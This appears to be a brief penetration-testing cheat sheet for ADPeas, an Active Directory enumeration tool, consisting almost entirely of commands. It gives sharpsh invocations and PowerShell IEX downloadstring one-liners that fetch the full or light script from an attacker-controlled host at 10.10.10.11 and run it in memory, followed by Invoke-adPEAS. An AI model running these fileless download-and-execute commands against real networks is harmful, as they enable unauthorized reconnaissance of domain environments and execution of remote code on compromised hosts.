# ADPeas

The light version does not contain bloodhound within, suggested to use that.

    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/adPEAS.ps1 -c "Invoke-adPEAS"'
    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/adPEAS-Light.ps1 -c "Invoke-adPEAS"'


### Load when in a shell

    IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/adPEAS-Light.ps1'))
    IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/adPEAS.ps1'))


### Run

    Invoke-adPEAS
